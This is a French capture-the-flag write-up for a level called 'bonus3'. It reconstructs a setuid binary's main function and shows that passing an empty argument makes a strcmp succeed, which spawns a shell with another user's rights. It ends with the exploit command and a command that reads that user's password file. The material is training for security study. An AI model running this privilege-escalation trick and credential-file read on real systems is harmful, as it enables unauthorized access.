# bonus3

## Démarche

1. **Reconnaissance**

   **Permissions / SUID.** Le binaire porte le bit setuid vers `end` : un shell
   ouvert par l'executable tourne avec les droits de `end`, ce qui permet de lire
   `/home/user/end/.pass`.

   **Analyse.** Lecture du desassemblage de `main` :

   ```c
   int main(int argc, char *argv[])
   {
       char buff[132];
       FILE *f = fopen("/home/user/end/.pass", "r");

       if (f == NULL || argc != 2)
           return -1;

       fread(buff, 1, 66, f);        // 0x42 : lit 66 octets du .pass
       buff[0x41] = 0;               // buff[65] = 0
       buff[atoi(argv[1])] = 0;      // buff[num] = 0  <- position controlee
       fread(buff + 66, 1, 65, f);   // 0x41 : 2e lecture
       fclose(f);

       if (strcmp(buff, argv[1]) == 0)
           execl("/bin/sh", "/bin/sh", NULL);
       else
           puts(buff + 66);
       return 0;
   }
   ```

   Verifie dans gdb :
   ```console
   (gdb) x/s 0x80486f2
   0x80486f2:  "/home/user/end/.pass"
   (gdb) x/s 0x80486f0
   0x80486f0:  "r"
   ```

   Points cles :
   - le programme lit le `.pass` de `end` dans `buff`
   - `buff[atoi(argv[1])] = 0` ecrit un `\0` a une position **choisie par
     l'utilisateur** (via argv[1])
   - puis `strcmp(buff, argv[1])` : si egal -> `execl("/bin/sh")`

2. **Faille**

   La condition gagnante est `strcmp(buff, argv[1]) == 0` : il faut que `buff`
   (le debut du .pass, tronque) soit **egal** a `argv[1]`. Mais on ne connait pas
   le contenu du .pass.

   L'astuce : passer une **chaine vide** `argv[1] = ""`.

   - `atoi("") = 0` -> `buff[0] = 0` -> `buff` devient la chaine vide `""`
   - `argv[1]` est deja `""`
   - `strcmp("", "")` == 0 -> **egalite** -> `execl("/bin/sh")`

   On force simultanement les deux cotes a etre vides : `buff` par le `buff[0]=0`,
   et `argv[1]` par construction. L'egalite est triviale, sans jamais connaitre
   le .pass.

3. **Contournement / implémentation**

   ```bash
   ./bonus3 ""
   ```
   ```bash
   cat /home/user/end/.pass
   ```